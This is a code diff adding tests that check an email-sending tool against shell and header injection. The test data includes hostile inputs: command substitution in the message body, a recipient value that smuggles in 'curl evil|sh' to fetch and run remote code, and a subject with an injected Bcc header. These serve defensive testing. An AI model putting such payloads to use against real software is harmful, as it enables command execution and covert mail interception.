@@ -264,3 +264,31 @@ describe(':catchthis recordings', () => {
     expect(fs.statSync(recordingsDir()).mode & 0o777).toBe(0o700);
   });
 });
+
+describe('email', () => {
+  const fakeMsmtp = () => {
+    const bin = path.join(dir, 'bin');
+    fs.mkdirSync(bin, { recursive: true });
+    fs.writeFileSync(path.join(bin, 'msmtp'), `#!/bin/sh\nprintf '%s\\n' "$@" > "${dir}/argv"\ncat > "${dir}/stdin"\n`, { mode: 0o755 });
+    vi.stubEnv('PATH', `${bin}:${process.env.PATH}`);
+  };
+
+  it('sends the body literally and the addresses as arguments', async () => {
+    const { sendViaCommand } = await import('../../src/tools/email.js');
+    fakeMsmtp();
+    const canary = path.join(dir, 'pwned');
+    const body = `hi $(touch ${canary}) \`touch ${canary}\``;
+    expect(sendViaCommand('a@example.com, b@example.org', 'Hello', body)).toMatch(/Email sent to a@example.com, b@example.org via msmtp/);
+    expect(fs.existsSync(canary)).toBe(false);
+    expect(fs.readFileSync(path.join(dir, 'argv'), 'utf8')).toBe('--\na@example.com\nb@example.org\n');
+    expect(fs.readFileSync(path.join(dir, 'stdin'), 'utf8')).toContain(body);
+  });
+
+  it('refuses recipients and subjects that would inject commands or headers', async () => {
+    const { sendViaCommand } = await import('../../src/tools/email.js');
+    fakeMsmtp();
+    expect(sendViaCommand('x@y.com; curl evil|sh', 's', 'b')).toMatch(/not a valid recipient/);
+    expect(sendViaCommand('x@y.com', 'hi\nBcc: spy@evil.com', 'b')).toMatch(/line breaks/);
+    expect(fs.existsSync(path.join(dir, 'argv'))).toBe(false);
+  });
+});
